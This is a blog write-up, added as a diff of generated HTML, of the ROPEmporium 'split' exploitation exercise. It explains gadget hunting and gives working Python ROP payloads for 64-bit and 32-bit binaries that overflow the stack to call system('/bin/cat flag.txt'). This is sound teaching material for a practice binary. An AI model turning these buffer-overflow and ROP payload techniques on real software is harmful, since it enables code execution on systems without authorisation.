@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>split | ROPEmporium [2] - Arzedlab 🪵</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="In this challenge, we should run system() function with argument /bin/cat flag.txt" />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:1313/posts/ropemporium-split/">
+  <meta property="og:site_name" content="Arzedlab 🪵">
+  <meta property="og:title" content="split | ROPEmporium [2]">
+  <meta property="og:description" content="In this challenge, we should run system() function with argument /bin/cat flag.txt">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-12T14:20:25+05:00">
+    <meta property="article:modified_time" content="2024-11-12T14:20:25+05:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="ROPEmporium">
+    <meta property="article:tag" content="ROP">
+    <meta property="article:tag" content="Chain">
+    <meta property="article:tag" content="Exploitation">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="split | ROPEmporium [2]">
+  <meta name="twitter:description" content="In this challenge, we should run system() function with argument /bin/cat flag.txt">
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7198d56e4fe53ab4610aa7f913b8d3fa7453003ac7791c64a6d6157aecbbced5.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"   />
+	
+
+	
+	
+
+	
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Arzedlab 🪵</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">split | ROPEmporium [2]</h1>
+			<div class="meta">Posted on Nov 12, 2024</div>
+		</div>
+		
+		<div class="tldr">
+			<strong>tl;dr:</strong>
+			ROPEmporium - 2, split task writeup
+		</div>
+
+		
+		<div class="toc">
+		<strong>Table of contents:</strong>
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#find-the-out-the-offset-of-return-address">Find the out the offset of Return Address</a></li>
+    <li><a href="#explanation">Explanation</a></li>
+    <li><a href="#pop-rdi-ret">POP RDI; RET</a></li>
+    <li><a href="#function-system-64-bit">Function <code>system()</code> 64-bit</a></li>
+    <li><a href="#payload-64-bit">Payload 64-bit</a></li>
+    <li><a href="#result-64-bit">Result 64-bit</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#payload-32-bit">Payload 32-bit</a></li>
+    <li><a href="#explanation-32-bit">Explanation 32-bit</a></li>
+    <li><a href="#rop-chain-breakdown-32-bit">ROP Chain Breakdown 32-bit</a></li>
+  </ul>
+</nav>
+		</div>
+
+		<section class="body">
+			<h1 id="split">split</h1>
+<p>This is our next challenge, read the description of challenge :</p>
+<hr>
+<p><strong>Still here</strong></p>
+<p>I&rsquo;ll let you in on a secret: that useful string <code>&quot;/bin/cat flag.txt&quot;</code> is still present in this binary, as is a call to <code>system()</code>. It&rsquo;s just a case of finding them and chaining them together to make the magic happen.</p>
+<hr>
+<p>In this challenge, we should run <code>system()</code> function with argument <code>/bin/cat flag.txt</code> , let’s build the ROP chain that first comes to mind:</p>
+<ol>
+<li>Find the string <code>/bin/cat flag.txt</code> , and put the address of this string into <strong>RDI (arg0 in x64)</strong></li>
+<li>Populate/Run the function <code>system()</code>  from PLT section</li>
+</ol>
+<p>There can be some pitfalls like not aligned stack before running <code>system()</code> , that’s why we use <code>ret</code>  gadget to align the stack</p>
+<p>Checking the security of binary by <code>checksec ./binary</code></p>
+<p><img src="image.png" alt="image.png"></p>
+<p>This indicates that there are no <strong>stack canaries</strong> or <strong>Position Independent Executables</strong> (PIE), and we do not need to worry about Address Space Layout Randomization (ASLR) since it only applies to the libc.</p>
+<h2 id="find-the-out-the-offset-of-return-address">Find the out the offset of Return Address</h2>
+<p><img src="image1.png" alt="image.png"></p>
+<p><img src="image2.png" alt="image.png"></p>
+<p>The offset of Return Address is <strong>40</strong></p>
+<p>Find the string <code>/bin/cat flag.txt</code> with the command <code>strings -a -t x ./split | grep /bin/cat</code></p>
+<h2 id="explanation">Explanation</h2>
+<ul>
+<li><code>strings</code>: This command searches for sequences of printable characters in a binary file. It is commonly used to find human-readable text in executable files or data files.</li>
+<li><strong><code>a</code></strong>: This option tells <code>strings</code> to scan the entire file, not just the default sections (like the text section). This is useful for searching through data segments or other non-standard sections of a binary file.</li>
+<li><strong><code>t x</code></strong>: This option specifies the format of the output for the offset of each string found. The <code>x</code> indicates that the offsets should be displayed in hexadecimal format. Other formats include <code>d</code> for decimal and <code>o</code> for octal.</li>
+</ul>
+<p><img src="image3.png" alt="image.png"></p>
+<hr>
+<h2 id="pop-rdi-ret">POP RDI; RET</h2>
+<p>We have the address of the gadget which reads the flag.txt, move on to the next stage, we need the the <code>pop rdi, ret;</code> gadget for beginners I will describe in in three intructions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">rdi</span>, [<span style="color:#8be9fd;font-style:italic">rsp</span>]<span style="color:#6272a4">; // Takes the current value from the address of RSP and puts the value into RDI</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">add</span> <span style="color:#8be9fd;font-style:italic">rsp</span>, <span style="color:#bd93f9">8</span><span style="color:#6272a4">; // This effectively moves the stack pointer up in memory, which means that you are removing (or &#34;popping&#34;) 8 bytes of data from the stack.</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">ret</span><span style="color:#6272a4">; // and return back</span>
+</span></span></code></pre></div><p>In case of searching for gadgets, I primarily use two tools: <code>Ropper</code> and <code>RP++</code>.</p>
+<p><code>ropper --file ./split --search pop</code></p>
+<p><img src="image4.png" alt="image.png"></p>
+<p><code>rp++ -r2 --unique -f ./split | grep &quot;pop&quot;</code></p>
+<ul>
+<li><code>-r2</code> useful gadget numbers, <code>2</code> is the gadget maximum size in instructions, more than <code>3</code>  is not stable for ROP</li>
+<li><code>--unique</code>  do not print the same gadget multiple times (optional)</li>
+<li><code>-f</code>  file to search</li>
+</ul>
+<p><img src="image5.png" alt="image.png"></p>
+<hr>
+<h2 id="function-system-64-bit">Function <code>system()</code> 64-bit</h2>
+<p>The <code>system()</code> function is indeed part of the C standard library (libc), and when a program calls <code>system()</code>, it typically goes through the PLT if the binary is dynamically linked.
+The PLT serves as an intermediary to resolve the actual address of <code>system()</code> from the GOT. Initially, the PLT entry for <code>system()</code> points to a resolver function, which will resolve the actual address of <code>system()</code> in libc and update the GOT entry.
+Once resolved, subsequent calls to <code>system()</code> will directly use the resolved address from the GOT</p>
+<p>For now enough to know only the PLT address of <code>system()</code></p>
+<p><img src="image6.png" alt="image.png"></p>
+<p>ROP chain: <strong><code>pop rdi; ret</code></strong>  + <strong>address of string <code>/bin/cat flag.txt</code></strong>  + <strong><code>ret;</code></strong> (gadget is optional depends on alignment of stack before calling <code>system()</code>)  + <strong><code>system@plt</code></strong></p>
+<h2 id="payload-64-bit">Payload 64-bit</h2>
+<p>Payload (By the way, some people may ask why this guy is using a linear <code>struct.pack</code> instead of <code>pwntools</code>, the answer is simple, showing you from where we are taking address all these addresses, and writing these address manually is the best practice for beginners, anyway you can rewrite this payload with <code>pwntools</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>from struct import pack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system_plt <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400560</span> 
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4007c3</span> 
+</span></span><span style="display:flex;"><span>ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40053e</span>
+</span></span><span style="display:flex;"><span>bin_cat_flag <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00601060</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">40</span>  <span style="color:#6272a4"># Offset to overwrite EIP</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, pop_rdi)  <span style="color:#6272a4"># pop ebx; ret;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, bin_cat_flag)  <span style="color:#6272a4"># Address of &#34;/bin/cat flag.txt&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, ret) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, system_plt)  <span style="color:#6272a4"># Call system@plt</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Output the payload</span>
+</span></span><span style="display:flex;"><span>with open(<span style="color:#f1fa8c">&#34;payload&#34;</span>, <span style="color:#f1fa8c">&#34;wb&#34;</span>) as f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">.</span>write(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Payload written to &#39;payload&#39;&#34;</span>)
+</span></span></code></pre></div><h2 id="result-64-bit">Result 64-bit</h2>
+<p>We get the flag!</p>
+<p><img src="image7.png" alt="image.png"></p>
+<h1 id="split-x32">split x32</h1>
+<p>Everything is the same except for alignment and addresses (32-bit)</p>
+<h2 id="payload-32-bit">Payload 32-bit</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> struct <span style="color:#ff79c6">import</span> pack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_ebx_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x8048395</span>
+</span></span><span style="display:flex;"><span>read_flag   <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0804a030</span>
+</span></span><span style="display:flex;"><span>system_plt   <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x080483e0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">44</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, system_plt)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, read_flag)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;payload&#34;</span>, <span style="color:#f1fa8c">&#34;wb&#34;</span>) <span style="color:#ff79c6">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">.</span>write(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Payload written to &#39;payload&#39;&#34;</span>)
+</span></span></code></pre></div><p>In this ROP chain, the <code>0x0</code> after <code>system_plt</code> serves as a <strong>placeholder for the return address</strong>.</p>
+<h2 id="explanation-32-bit">Explanation 32-bit</h2>
+<ul>
+<li>In 32-bit (x86) architecture, when calling a function like <code>system</code> in a ROP chain, the function expects the <strong>next item on the stack</strong> to be a return address. This address tells the program where to continue execution after <code>system</code> completes. Since you don&rsquo;t need to return to any specific location after <code>system</code> (and likely just want <code>system</code> to execute <code>read_flag</code>), <code>0x0</code> is used as a <strong>dummy return address</strong>. This is common in ROP chains to satisfy the function&rsquo;s calling convention.</li>
+</ul>
+<h2 id="rop-chain-breakdown-32-bit">ROP Chain Breakdown 32-bit</h2>
+<ol>
+<li><strong><code>payload += pack('&lt;I', system_plt)</code></strong>: Adds the address of <code>system</code> (in the PLT) to execute the <code>system</code> function.</li>
+<li><strong><code>payload += pack('&lt;I', 0x0)</code></strong>: Adds <code>0x0</code> as a placeholder return address, which is required in the stack layout but will not be used here.</li>
+<li><strong><code>payload += pack('&lt;I', read_flag)</code></strong>: Adds the address of <code>read_flag</code>, the string you want to pass as an argument to <code>system</code>.</li>
+</ol>
+<p>The <code>0x0</code> value is necessary to align the stack correctly for the <code>system</code> function call, allowing the ROP chain to function as expected. In x86, functions generally expect a return address, even if it’s unused, and including it prevents crashes or unexpected behavior.</p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/writeup">writeup</a></li>
+					
+					<li><a href="/tags/ropemporium">ROPEmporium</a></li>
+					
+					<li><a href="/tags/rop">ROP</a></li>
+					
+					<li><a href="/tags/chain">chain</a></li>
+					
+					<li><a href="/tags/exploitation">exploitation</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/arzedlab/" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © Ravshan | Made with Love ❤️ <a href="https://twitter.com/arzedlab/"> My Twitter 🪽</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
